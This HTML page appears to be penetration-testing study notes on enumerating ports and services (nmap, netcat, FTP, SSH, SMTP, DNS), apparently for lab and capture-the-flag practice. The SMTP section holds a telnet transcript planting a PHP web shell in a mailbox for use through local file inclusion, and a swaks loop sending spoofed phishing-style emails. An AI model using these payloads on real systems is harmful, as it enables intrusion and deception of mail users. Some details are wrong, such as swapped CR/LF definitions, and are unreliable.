<html>
<head>
    <title>Enumerating Ports & Services</title>
    <a href="https://pusher91.github.io/Blog/">Return to Main Page</a>
</head>

<hr>

<body>

    <h1>Enumerating Ports & Services</h1>

<hr>

    <h2>Port Scanning</h2>
    <ul>
        <li>Running scan with -sV and -sC at the same time or each separately can give different responses in some cases.</li>
        <li>If UDP shows open|filtered then run scripts with -sC.  This will be more likely to get a response from the port to confirm if it is open or not.  Sometimes open ports only show up while using -sT (rare.  Maybe only an ISAKMP/ipsec issue?)</li>
        <li>If tools can't find service version then use wireshark.</li>
</ul>

<h4>Nmap</h4>

<ul>
    <li>Output all open ports to comma separated list:</li>
        <ul>
            <li>sudo nmap -p- &lt;ip address&gt; -oA &lt;output name&gt;</li>
            <li>cat &lt;nmap scan&gt; | grep open | awk -F/ '{print $1}' ORS=','</li>
        </ul>
</ul>


<table>
    <tr>
        <td>Show justification for scan results</td>
        <td>--reason</td>
    </tr>
    <tr>
        <td>Banner grab / version detection</td>
        <td>-sV</td>
    </tr>
    <tr>
        <td>"Safe scripts".  Default script scan.  Some are intrusive.</td>
        <td>-sC</td>
    </tr>
    <tr>
        <td>Top 1000 ports</td>
        <td>--top-ports 1000</td>
    </tr>
    <tr>
        <td>UDP Scan</td>
        <td>-sU</td>
    </tr>
    <tr>
        <td>TCP & UDP Scan</td>
        <td>-sTU</td>
    </tr>
    <tr>
        <td>
            <ul>Packets per second to send
                <li>nmap may send less if:
                    <ul><li>It has nothing to send</li>
                        <li>Hardware Limit</li>
                    </ul>
                </li>
                </ul>
        </td>
         <td>--min-rate &lt;#&gt;</td>
    </tr>
</table>

<h4>netcat</h4>

<table>
    <tr>
        <td>TCP Port Scan</td>
        <td>nc -nvv -w 1 -z &lt;ip address&gt; &lt;port #&gt; &lt;port #&gt;</td>
    </tr>
    <tr>
        <td>UDP Port Scan</td>
        <td>nc -nv -u -z -w 1 &lt;ip address&gt; &lt;port #&gt; &lt;port #&gt;</td>
    </tr>
</table>

    <ul>
        <li>w: Connection timeout in seconds</li>
        <li>z: Specify Zero-I/O mode which will send no data and is used for scanning</li>
    </ul>

<p>UDP Scanning relies on the server to send back a "ICMP Port Unreachable" message to know if a port is open or closed.  If the server doesn't send back this message (port is filtered by a firewall, etc) then the port will look like it is open when it is not.</p>

<table>
    <tr>Bash script for port scanning</tr>
    <tr>
        <pre>#!/bin/bash host=10.5.5.11
for port in {1..65535}; do
    timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
    echo "port $port is open"
done
echo "Done"</pre>
    </tr>
</table>

<p>Massscan - Possbily the fastest port scanner.</p>

<h2>21 TCP / FTP</h2>

<ul>
    <li>If FTP is rejecting user login *without* asking for a password then we can enumerate users</li>
    <li>Tools
        <table>
          <tr>
              <td>Connect to server</td>
              <td>ftp &lt;ip addres&gt;</td>
          </tr>
          <tr>
              <td>Upload file</td>
              <td>put &lt;file&gt;</td>
          </tr>
          <tr>
              <td>Download file</td>
              <td>get &lt;file&gt;</td>
          </tr>
          <tr>
              <td>Upload multiple files</td>
              <td>mput *[.&lt;.php/.html/etc...&gt;]</td>
          </tr>
          <tr>
              <td>Download multiple files</td>
              <td>mget *[.&lt;.php/.html/etc...&gt;]</td>
          </tr>
          <tr>
              <td>Local current directory</td>
              <td>lcd</td>
          </tr>
          <tr>
              <td>Set binary mode</td>
              <td>binary</td>
          </tr>
        </table>
    </li>
    <li>
        wget
        <table>
            <tr>
                <td>Recursively download FTP contents</td>
                <td>wget -r ftp://&lt;user&gt;&lt;ip address&gt; --password=&lt;password&gt;</td>
            </tr>
            <tr>
                <td>Mirror FTP</td>
                <td>wget --mirror ftp://&lt;user&gt;:&lt;password&gt;@&lt;ip address&gt;</td>
            </tr>
        </table>
    </li>
    <li>Proftp
        <ul>
            <li>Can copy a file between remote directories using write permissions
                <table>
                    <tr>
                        <td>Connect to FTP server </td>
                        <td>telnet &lt;ip address&gt; &lt;port&gt;</td>
                    </tr>
                    <tr>
                        <td>Select a file to copy</td>
                        <td>site cpfr &lt;remote file&gt;</td>
                    </tr>
                    <tr>
                        <td>Select a location to copy file to</td>
                        <td>Site cpto &lt;remote directory to copy file to&gt;</td>
                </tr>
                </table>
            </li>
        </ul>
    </li>
</ul>

<h2>22 TCP / SSH</h2>

<ul>
    <li>Most common attack is brute forcing
        <ul>
            <li>Password attacks against enumerated usernames and default usernames</li>
            <li>Brute force password with Hydra</li>
            <li>Brute force priavete keys with Crowbar</li>
            <li>Fuzz passwords using patator</li>
            <li>Metasploit ssh_login</li>
            <li>Bruteforcing can lock you out.  Possibly for a set period of time.</li>
        </ul>
    </li>
    <li>Sometimes the password prompt is disabled and login is only allowed using a private key</li>
    <li>SSH Key Fingerprint
        <ul>
            <li>Based on the hosts public key
                <li>/etc/ssh/ssh_host_rsa_key.pub</li>
                <li>Used for easy identification of the hosts public key</li>
            </li>
        </ul>
    </li>
</ul>

<table>
    <tr>
        <td>Connect with a different key exchange algorithm</td>
        <td>-oKexAlgorithms=+&lt;algorithm&gt;</td>
    </tr>
    <tr>
        <td>Connect with a different type of key</td>
        <td>-oPubkeyAcceptedKeyTypes=+&lt;key type - example: ssh-dss&gt;</td>
    </tr>
</table>

<h2>25 TCP / SMTP</h2>

<ul>
    <li>Simple Mail Transfer Protocol</li>
        <ul>
            <li>SMTP Commands:
                <table>
                    <tr>
                        <td>VRFY &lt;username&gt;</td>
                        <td>asks a server to verify an email address</td>
                    </tr>
                    <tr>
                        <td>EXPN</td>
                        <td>Asks the server for the membership of a mailing list</td>
                    </tr>
                </table>
            </li>
            <li>Sends mail</li>
            <li>On internal networks you can typically send emails as anybody</li>
            <li>SMTP poisoning
                <pre>
telnet 10.0.0.12 25
Trying 10.0.0.12...
Connected to 10.0.0.12.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
HELO example.com
250 symfonos.localdomain
mail from: hacker@example.com
250 2.1.0 Ok
rcpt to: helios@symfonos.localdomain
250 2.1.5 Ok
data
354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
subject: 
&lt;?php echo shell_exec($_GET['cmd]); ?&gt;
.
250 2.0.0 Ok: queued as 8A6884082B
quit
221 2.0.0 Bye
Connection closed by foreign host.
                </pre>
            </li>
            <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
        </ul>
    </li>
    <li>Tools
        <ul>
            <li>nc
                <ul>
                <li>Use nc -nvC to implement a full CRLF, sometimes this is needed if a response is not being received from the server
                    <table>
                        <tr>
                            <td>CR - Carriage Return</td>
                            <td>\n</td>
                        </tr>
                        <tr>
                            <td>LF - Line Feed</td>
                            <td>\r</td>
                        </tr>
                    </table>
                </li>
                </ul>
            </li>
        </ul>
    </li>
    <li>Telnet</li>
    <li>swaks
        <ul>
            <li>Swiss Army Knift SMTP
                <li>
                    <table>
                        <tr>
                        <tr>Bash script to send emails to a list</tr>
                        <tr>
                                <pre>for email in $(cat email.lst);
do
    swaks \
        --from support@sneakymailer.htb \
        --to $email \
        --header 'Subject: Please Register Your Account' \
        --body 'http://10.10.14.106/test' \
        --server sneakymailer.htb
done;</pre>
                        </tr>
                        </tr>
                    </table>
                </li>
            </li>
        </ul>
    </li>
    <li>Thunderbird
        <ul>
            <li>Mail client</li>
        </ul>
    </li>
    <li>Evolution
        <ul>
            <li>Mail Client</li>
            <li>Alt+F2</li>
        </ul>
    </li>
</ul>

<h2>53 TCP / DNS</h2>

<ul>
    <li>If DNS is running then we can edit /etc/resolv.conf instead of /etc/hosts so it will autobatically grab other DNS names</li>
        <ul>
            <li>resolv.conf hosts will be searched in order from top to bottom</li>
        </ul>
    </ul>
    <li>nslookup</li>
        <table>
            <tr>
                <td>Resolve IP to domain name</td>
                <td>
                    <table>
                        <tr>
                            <td>Start nslookup in interactive mode</td>
                            <td>nslookup</td>
                        </tr>
                        <tr>
                            <td>Enter server IP</td>
                            <td>&gt;ip address&lt;</td>
                        </tr>
                        <tr>
                            <td>Enter IP and/or hostname to resolve against the server</td>
                            <td>
                                <ul>
                                    <li>ip addresses to try:</li>
                                        <ul>
                                            <li>ip of the nameserver itself</li>
                                            <li>127.0.0.1</li>
                                            <li>127.0.0.2</li>
                                            <li>Any other suspected interested ip addresses or hostnames</li>
                                        </ul>
                                </ul>
                            </td>
                        <tr>
                            <td>Zone transfer</td>
                            <td>ls -d &lt;domain&gt;</td>
                        </tr>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
    <li>Host</li>
        <ul>
            <table>
                <tr>
                    <td>Resolve IP to domain name</td>
                    <td>Host &lt;ip address&gt;<br>TEST</td>
                </tr>
            </table>
        </ul>
</ul>




</body>
</html>

